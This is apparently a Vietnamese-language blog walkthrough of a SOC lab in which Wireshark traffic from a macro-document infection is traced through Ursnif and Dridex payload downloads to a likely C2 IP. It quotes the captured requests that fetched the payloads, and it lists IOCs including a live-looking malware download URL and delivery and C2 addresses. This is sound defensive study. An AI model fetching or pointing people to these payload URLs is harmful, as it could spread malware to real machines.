---
title: "Network Analysis – Malware Compromise"
date: 2026-07-23 00:00:00 +07000
categories: [Network Analysis]

---

## Scenario

A SOC Analyst at Umbrella Corporation is going through SIEM alerts and sees the alert for connections to a known malicious domain. The traffic is coming from Sara’s computer, an Accountant who receives a large volume of emails from customers daily. Looking at the email gateway logs for Sara’s mailbox there is nothing immediately suspicious, with emails coming from customers. Sara is contacted via her phone and she states a customer sent her an invoice that had a document with a macro, she opened the email and the program crashed. The SOC Team retrieved a PCAP for further analysis.


![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-22-48-16.png)

<br>

Chào mừng bạn đọc đến với chủ đề phân tích lưu lượng mạng trong một sự cố nghi nhiễm mã độc. Ở bài thực hành này, chúng ta sẽ cùng mổ xẻ một file PCAP để lần theo các dấu hiệu bất thường sau khi một tài liệu có macro được mở trên máy nạn nhân. Mục tiêu cuối cùng là truy vết được luồng lây nhiễm, xác định càng nhiều IOC càng tốt, và từ đó đưa ra một kết luận rõ ràng, có cơ sở về hoạt động của mã độc trong hệ thống.

Công cụ chính được sử dụng xuyên suốt bài này là **Wireshark**

<br>

Sau khi mở file PCAP với Wireshark, trông nó sẽ

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-22-49-47.png)

Thông thường những ai chưa quen với công cụ này sẽ thấy “ngợp” vì không biết phải đọc gì tiếp theo. Mình có một tip mỗi khi phân tích bằng Wireshark là dùng tính năng Protocol Hierarchy để cho biết toàn bộ các giao thức xuất hiện trong file PCAP, kèm theo số lượng packet, dung lượng byte và tỷ trọng của từng loại traffic.

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-22-53-02.png)

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-22-53-17.png)

Nói đơn giản, thay vì nhìn vào hàng nghìn dòng packet một cách rời rạc, Protocol Hierarchy giúp mình có một bức tranh tổng quan trước: trong file này có DNS không, có HTTP không, có TLS không, có SMB hay các giao thức bất thường nào không. Từ đó, mình sẽ biết nên bắt đầu điều tra từ đâu và ưu tiên loại traffic nào trước.

Chẳng hạn ở đây, mình sẽ bắt đầu với Data. **Chuộc phải > Apply as Filter > Selected**

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-22-56-20.png)

Phần Data cho biết trong file PCAP có những gói tin chứa dữ liệu payload mà Wireshark không tự phân tích sâu hơn thành một giao thức cụ thể như HTTP, DNS hay TLS. Nói cách khác, đây có thể là những đoạn dữ liệu thô được truyền qua TCP/UDP, hoặc là nội dung mà Wireshark chưa nhận diện được rõ ràng.

Trong quá trình phân tích mã độc, mình thường không bỏ qua phần này, vì đôi khi các payload đáng nghi, dữ liệu tải xuống, hoặc nội dung giao tiếp với C2 có thể nằm trong những packet dạng Data như vậy. Việc filter riêng phần này giúp thu hẹp phạm vi quan sát, thay vì phải nhìn toàn bộ hàng nghìn packet trong capture.

<br>

## Xác định điểm khởi đầu lây nhiễm

<br>

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-23-01-36.png)

Sau khi Apply as Filter, mình thấy chỉ có một packet xuất hiện. Mình tiến hành **Follow Stream** để xem được toàn bộ cuộc trò chuyện giữa các packet rõ ràng hơn

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-23-23-03-02.png)

Ngay khi mở Follow HTTP Stream, có một điểm rất đáng chú ý: máy nội bộ đã gửi request đến domain **kychenogg.com** để tải về một file có tên **spet10.spr**.

```http
GET /QIC/tewokl.php?l=spet10.spr HTTP/1.1
Host: kychenogg.com
```

Ở phía server, response trả về trạng thái **HTTP/1.1 200 OK**, nghĩa là request đã thành công và file đã được tải xuống. Phần header cũng cho biết server đang trả về một file đính kèm:

```http
Content-Disposition: attachment; filename="spet10.spr"
Content-Type: application/octet-stream
Content-Length: 261120
```
Điểm thú vị nằm ở phần nội dung bên dưới. Dù file được đặt tên với extension .spr, phần đầu của payload lại bắt đầu bằng chuỗi:

```bash
MZ
This program cannot be run in DOS mode.
```

Đây là dấu hiệu rất quen thuộc của một file **Windows executable / PE file**. Nói cách khác, file **spet10.spr** không đơn thuần là một file dữ liệu bình thường, mà nhiều khả năng là một file thực thi Windows được ngụy trang bằng phần mở rộng khác.

Đến đây, mình có thể ghi nhận một IOC khá rõ:

```bash
Suspicious domain: kychenogg.com
HTTP URI: /QIC/tewokl.php?l=spet10.spr
Downloaded file: spet10.spr
File type indicator: MZ / PE executable
Content-Length: 261120 bytes
```

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-09-27-15.png)

Mình nhận thấy IP 10.11.27.101 chủ động kết nối đến 95.181.198.231, sau đó gửi yêu cầu để tải xuống file **spet10.spr**. Mình nghi ngờ địa chỉ 10.11.27.101 là **victim** và 95.181.198.231 là **server** phân phối payload

Điều này được thể hiện khá rõ qua quá trình bắt tay TCP ban đầu:

```bash
10.11.27.101      → 95.181.198.231    SYN
95.181.198.231    → 10.11.27.101      SYN, ACK
10.11.27.101      → 95.181.198.231    ACK
```

Chi tiết này rất quan trọng vì nó cho thấy đây không chỉ là một kết nối ngẫu nhiên đến IP ngoài, mà là một hành động có mục đích: **truy cập vào một đường dẫn cụ thể để tải xuống một file cụ thể**. Kết hợp với phần Follow HTTP Stream ở trên, file spet10.spr có header MZ, dấu hiệu đặc trưng của một file thực thi Windows PE.

Từ đây, mình có thể dựng được một phần của chuỗi lây nhiễm như sau:

```bash
Victim: 10.11.27.101
        ↓
Kết nối đến 95.181.198.231 qua HTTP port 80
        ↓
Gửi request đến domain kychenogg.com
        ↓
Tải xuống file spet10.spr
        ↓
File tải về có dấu hiệu là Windows executable
```

<br>

Tiếp theo, mình thử filter Wireshark như sau:

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-09-38-04.png)

Ở bước này, mình dùng filter `http.request.method` để liệt kê toàn bộ các HTTP request có trong file PCAP. Cách này giúp mình nhìn nhanh xem victim đã gửi request đến những domain/IP nào, truy cập URI nào, và có request nào bất thường hay không.

Có thể thấy ngoài request tải file `spet10.spr` từ `kychenogg.com`, máy `10.11.27.101` còn gửi nhiều request đến domain `cochrimato.com`. Đáng chú ý là một số request truy cập vào đường dẫn bắt đầu bằng `/images/`, nhưng phần phía sau lại là những chuỗi rất dài, khó đọc và không giống tên file ảnh thông thường.

Điều này khiến mình nghi ngờ rằng đây không đơn thuần là request tải ảnh, mà có thể là một dạng **encoded data** hoặc request được malware tạo ra để giao tiếp với server. Vì vậy, mình quyết định lần theo stream này bằng **Follow HTTP Stream** để xem toàn bộ nội dung trao đổi giữa client và server.

<br>

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-09-39-36.png)

Khi mở stream, ta thấy request được gửi đến host `cochrimato.com` với URI rất dài nằm dưới thư mục /images/. Phần request header cho thấy đây là một HTTP GET request khá giống traffic trình duyệt thông thường, bao gồm `User-Agent`, `Accept`, `Accept-Language`, `Accept-Encoding` và `Cookie`.

Tuy nhiên, điểm đáng nghi nằm ở chính URI. Một đường dẫn trong thư mục `/images/` nhưng lại chứa chuỗi dài bất thường có thể là dấu hiệu malware đang cố ngụy trang traffic C2 thành request web hợp lệ. Nói cách khác, malware có thể đang tận dụng HTTP GET request để gửi dữ liệu hoặc nhận phản hồi từ server điều khiển.

Ở phía server, response trả về `HTTP/1.1 200 OK`, đồng thời có các header như:

```bash
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.45-0+deb7u14
Set-Cookie: PHPSESSID=...
Content-Type: text/html
Transfer-Encoding: chunked
```

Điều này cho thấy phía server đang chạy PHP và có tạo session cho client. Trong bối cảnh phân tích malware, đây là một chi tiết cần lưu ý vì nhiều C2 panel hoặc gate độc hại có thể được triển khai trên web server PHP.

Từ stream này, mình chưa vội kết luận ngay đây chắc chắn là C2, nhưng có thể ghi nhận một số dấu hiệu đáng nghi:

```bash
Victim IP: 10.11.27.101
Suspicious domain: cochrimato.com
Suspicious URI pattern: /images/<long encoded-looking string>
Protocol: HTTP
Method: GET
Server: Apache/2.2.22 (Debian)
Backend indicator: PHP/5.4.45
Cookie observed: PHPSESSID
```

<br>

## Phân tích hoạt động tải xuống mã độc thứ cấp sau khi nhiễm Ursnif

<br>

Sau khi đã xác định được máy `10.11.27.101` có hành vi tải xuống một file đáng ngờ từ `kychenogg.com`, mình tiếp tục mở rộng quá trình điều tra sang các **HTTP request** khác trong file **PCAP**. Ở giai đoạn này, trọng tâm không còn chỉ là tìm payload ban đầu, mà là xem sau khi bị nhiễm, máy nạn nhân có tiếp tục tải thêm thành phần mã độc nào khác hay không.

Trong nhiều chiến dịch thực tế, mã độc ban đầu không phải lúc nào cũng là payload cuối cùng. Một malware như Ursnif có thể đóng vai trò **initial foothold** hoặc **loader**, sau đó kết nối ra ngoài để tải thêm mã độc khác như **Dridex**. Vì vậy, mình sẽ tiếp tục quan sát các request HTTP để tìm dấu hiệu của hoạt động **follow-up malware download.**

Đầu tiên, mình dùng filter:

```bash
http.request.method
```

Filter này giúp hiển thị toàn bộ các request HTTP được gửi đi từ máy nạn nhân. Khi quan sát danh sách packet, mình nhận thấy có một request rất đáng chú ý: máy `10.11.27.101` gửi request đến `95.181.198.231` để tải một file có đuôi `.rar`.

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-10-04-55.png)

Chi tiết này ngay lập tức đáng nghi vì trước đó `95.181.198.231` đã từng xuất hiện trong hoạt động tải xuống payload ban đầu. Việc cùng một server tiếp tục được sử dụng để phân phối thêm một file `.rar` khiến mình nghi ngờ đây không phải là traffic bình thường, mà có thể là một phần trong chuỗi tải mã độc nhiều giai đoạn.

Để xác minh rõ hơn, mình tiến hành **Follow HTTP Stream** đối với packet này

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-10-08-18.png)

Trong stream, có thể thấy request được gửi trực tiếp đến địa chỉ IP `95.181.198.231`, không thông qua domain:

```bash
GET /oiioiashdqbwe.rar HTTP/1.1
Host: 95.181.198.231
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64)
Connection: Keep-Alive
Cache-Control: no-cache
```

Phía server phản hồi với trạng thái:

```bash
HTTP/1.1 200 OK
Content-Length: 254019
Content-Type: application/rar
```

Response `200 OK` cho thấy file đã được server trả về thành công. Bên cạnh đó, trường Content-Type là `application/rar`, xác nhận object được tải xuống là một file dạng RAR archive. Trong bối cảnh trước đó máy nạn nhân đã có hành vi tải file đáng ngờ, file `.rar` này rất có khả năng là **follow-up payload** được tải về sau khi quá trình lây nhiễm ban đầu đã diễn ra.

Tại đây, mình có thể nối các mảnh ghép lại với nhau:

```bash
Victim host: 10.11.27.101
        ↓
Initial suspicious download từ kychenogg.com / 95.181.198.231
        ↓
Host tiếp tục gửi HTTP GET request đến 95.181.198.231
        ↓
Tải xuống file oiioiashdqbwe.rar
        ↓
File được trả về với Content-Type: application/rar
```

Điểm quan trọng là `95.181.198.231` không chỉ xuất hiện một lần. IP này đã xuất hiện trong giai đoạn tải file ban đầu, rồi tiếp tục xuất hiện trong request tải file `.rar`. Điều này củng cố giả thuyết rằng đây là một malware delivery server, tức server được dùng để phân phối các payload trong nhiều bước khác nhau của infection chain.

Về mặt ngữ cảnh mã độc, **Ursnif** thường được biết đến như một banking **trojan / infostealer**, có khả năng đánh cắp thông tin đăng nhập, dữ liệu trình duyệt và thông tin tài chính. Trong một số chiến dịch, sau khi đã có foothold trên máy nạn nhân, nó có thể tải thêm payload khác về hệ thống.

Còn **Dridex** cũng là một **banking trojan**, nhưng thường được xem là một mã độc nguy hiểm hơn ở giai đoạn sau, có thể phục vụ cho **credential theft**, **C2 communication**, hoặc mở đường cho các hoạt động tấn công tiếp theo. Vì vậy, nếu **Ursnif** đóng vai trò mã độc ban đầu, thì **Dridex** có thể là **follow-up malware** được tải xuống để mở rộng mức độ kiểm soát của attacker trên máy nạn nhân.


Dựa trên request và response trong stream, mình có thể xác định URL đầy đủ mà máy nạn nhân đã dùng để tải file `.rar` là:

```bash
http://95.181.198.231/oiioiashdqbwe.rar
```

<br>

## Phân tích **Dridex post-infection traffic** và xác định **C2 IP**

Sau khi xác định được file `oiioiashdqbwe.rar` được tải xuống từ `95.181.198.231`, mình tiếp tục chuyển sang giai đoạn phân tích các kết nối xuất hiện sau thời điểm này. Đây là phần khá quan trọng, vì sau khi **follow-up malware** được tải về, máy nạn nhân có thể bắt đầu giao tiếp với các máy chủ điều khiển bên ngoài.

Ở bước này, mình vào **Statistics > Endpoints** trong Wireshark để quan sát toàn bộ các địa chỉ IP xuất hiện trong file `PCAP`. Mục tiêu là tìm xem sau giai đoạn tải payload, host `10.11.27.101` có tiếp tục kết nối đến những IP đáng ngờ nào hay không.

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-11-34-17.png)

Trong danh sách endpoint, mình nhận thấy có một địa chỉ IP bắt đầu bằng `185.` là `185.244.150.230`. Đây là IP bên ngoài và xuất hiện ngay sau giai đoạn **post-infection**, tức là sau khi máy nạn nhân tải xuống file `.rar` từ `95.181.198.231`.

Tuy nhiên, khi kiểm tra kỹ hơn, mình thấy trong file `PCAP` không chỉ có một IP bắt đầu bằng `185.`. Ngoài `185.244.150.230`, còn có một IP khác là `185.158.251.55`. Vì vậy, nếu chỉ dựa vào điều kiện “IP bắt đầu bằng `185.`” thì chưa đủ để kết luận. Mình cần đặt từng IP vào đúng **infection timeline** để xem IP nào có mối liên hệ chặt chẽ hơn với hoạt động của mã độc.

Trước đó, ở khoảng packet `911`, host `10.11.27.101` đã gửi request tải xuống file `oiioiashdqbwe.rar` từ `95.181.198.231`.

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-11-35-48.png)

```text
10.11.27.101 → 95.181.198.231
GET /oiioiashdqbwe.rar HTTP/1.1
```

Đây là thời điểm rất đáng chú ý vì file `.rar` này được xác định là **follow-up malware** trong chuỗi lây nhiễm. Ngay sau giai đoạn này, đến khoảng packet **1203**, host `10.11.27.101` tiếp tục chủ động thiết lập kết nối đến `185.244.150.230` qua port `443`.

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-11-37-52.png)

Quá trình kết nối được thể hiện qua TCP handshake:

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-11-38-20.png)

```text
10.11.27.101      → 185.244.150.230:443    SYN
185.244.150.230   → 10.11.27.101           SYN, ACK
10.11.27.101      → 185.244.150.230:443    ACK
10.11.27.101      → 185.244.150.230        TLSv1.2 Client Hello
```

Điều này cho thấy `10.11.27.101` là phía chủ động khởi tạo kết nối ra ngoài. Trong bối cảnh máy này vừa tải xuống payload đáng ngờ, kết nối TLS đến một IP lạ ngay sau đó là một dấu hiệu cần được ưu tiên kiểm tra.

Một điểm quan trọng khác là gói **Client Hello** đến `185.244.150.230` không chứa **SNI**. Thông thường, khi một trình duyệt hoặc ứng dụng hợp pháp truy cập website HTTPS, trường SNI sẽ cho biết client đang muốn truy cập domain nào. Tuy nhiên, ở đây client kết nối trực tiếp đến IP `185.244.150.230:443` mà không khai báo tên domain trong **SNI**.

Điều này làm tăng mức độ đáng nghi của traffic, vì nó gợi ý rằng malware có thể đang sử dụng **hardcoded C2 IP** thay vì truy cập qua domain thông thường. Khi kiểm tra thêm phần DNS, mình cũng không quan sát thấy DNS query nào resolve trực tiếp ra `185.244.150.230`. Nói cách khác, máy nạn nhân dường như đang kết nối thẳng đến IP này mà không cần bước phân giải tên miền.

Trong khi đó, IP `185.158.251.55` cũng xuất hiện trong file `PCAP`, nhưng nó xuất hiện muộn hơn, khoảng packet `1420+ / 1429`, tức là sau một khoảng thời gian đáng kể so với thời điểm tải xuống file `.rar`. Vì vậy, xét theo **timeline correlation**, `185.244.150.230` có mối liên hệ gần và rõ hơn với giai đoạn **post-infection**.

![](/assets/img/posts/2026-07-23-Network-Analysis/2026-07-24-11-41-03.png)

<br>

Đến đây, mình có thể nối các bằng chứng lại như sau:
- Host nghi nhiễm là `10.11.27.101`
- Host này tải xuống file `oiioiashdqbwe.rar` từ `95.181.198.231`
- Ngay sau đó, host tiếp tục kết nối đến `185.244.150.230:443`
- Kết nối sử dụng **TLSv1.2**
- Gói Client Hello không có **SNI**
- Không thấy DNS query resolve trực tiếp ra `185.244.150.230`
- IP `185.158.251.55` xuất hiện muộn hơn nên có mức độ liên kết thấp hơn với thời điểm tải payload

Từ các yếu tố trên, điểm quyết định không chỉ nằm ở việc IP bắt đầu bằng `185.`, mà là sự kết hợp giữa **timeline, post-infection behavior, TLS traffic, No SNI, No DNS resolution** và mối liên hệ với hoạt động tải xuống `oiioiashdqbwe.rar`.

Vì vậy, địa chỉ IP phù hợp nhất với **Dridex post-infection traffic** là: `185.244.150.230`

Các IOC có thể ghi nhận ở giai đoạn này:

```text
Victim IP: 10.11.27.101
Dridex post-infection IP: 185.244.150.230
Destination port: 443
Protocol: TLSv1.2
Notable behavior: Client Hello without SNI
DNS observation: No DNS query resolving to 185.244.150.230 observed
Assessment: Possible hardcoded C2 IP / encrypted C2 communication
```

<br>



## Kết luận

Qua quá trình phân tích file `PCAP`, mình có thể dựng lại được một chuỗi lây nhiễm khá rõ ràng. Ban đầu, host nội bộ `10.11.27.101` có dấu hiệu truy cập đến domain đáng ngờ `kychenogg.com` và tải xuống file `spet10.spr` từ server `95.181.198.231`. Mặc dù file này không mang đuôi `.exe`, nội dung bên trong lại có dấu hiệu `MZ`, cho thấy đây nhiều khả năng là một file thực thi Windows được ngụy trang.

Sau đó, traffic tiếp tục cho thấy host `10.11.27.101` tải thêm file `oiioiashdqbwe.rar` từ `95.181.198.231`. Dựa trên ngữ cảnh của bài lab, đây là file được **Ursnif** sử dụng để retrieve **Dridex** về máy nạn nhân. Điều này cho thấy cuộc tấn công không dừng lại ở payload ban đầu, mà tiếp tục chuyển sang giai đoạn tải **follow-up malware**.

Ở giai đoạn **post-infection**, mình phát hiện host `10.11.27.101` chủ động thiết lập kết nối `TLSv1.2` đến `185.244.150.230:443`. Điểm đáng chú ý là kết nối này xuất hiện ngay sau giai đoạn tải file `.rar`, gói `Client Hello` không chứa `SNI`, và không quan sát thấy DNS query nào resolve trực tiếp ra `185.244.150.230`. Những yếu tố này gợi ý rằng malware có thể đang sử dụng **hardcoded C2 IP** để giao tiếp với máy chủ điều khiển.

Mặc dù trong file `PCAP` còn có một IP khác cũng bắt đầu bằng `185.` là `185.158.251.55`, địa chỉ này xuất hiện muộn hơn đáng kể so với thời điểm tải payload. Vì vậy, xét theo **infection timeline**, **TLS behavior**, **No SNI**, **No DNS resolution** và mối liên hệ trực tiếp với hoạt động tải xuống `oiioiashdqbwe.rar`, IP có khả năng liên quan đến **Dridex post-infection traffic** là `185.244.150.230`.

Các **IOC** quan trọng ghi nhận được trong bài thực hành này bao gồm:

```text
Victim IP:
10.11.27.101

Suspicious domain:
kychenogg.com
cochrimato.com

Payload delivery IP:
95.181.198.231

Initial suspicious file:
spet10.spr

Follow-up malware URL:
http://95.181.198.231/oiioiashdqbwe.rar

Follow-up malware file:
oiioiashdqbwe.rar

Dridex post-infection IP / possible C2:
185.244.150.230

Destination port:
443

Protocol:
TLSv1.2

Notable behavior:
Client Hello without SNI
No DNS resolution observed for 185.244.150.230
```

Tổng kết lại, bài thực hành này cho thấy tầm quan trọng của việc không chỉ nhìn vào một packet đơn lẻ, mà phải đặt từng dấu hiệu vào đúng timeline của cuộc tấn công. Bằng cách kết hợp `HTTP request`, `Follow Stream`, `Export HTTP Objects`, `Endpoints`, `DNS traffic và TLS handshake`, mình có thể từng bước xác định được victim, payload server, follow-up malware URL và post-infection C2 indicator.

Đây cũng là một ví dụ điển hình cho cách phân tích network traffic trong một case nhiễm mã độc: bắt đầu từ dấu hiệu bất thường, lần theo từng kết nối, trích xuất IOC, rồi cuối cùng đưa ra kết luận dựa trên bằng chứng thay vì chỉ dựa vào một chỉ báo đơn lẻ.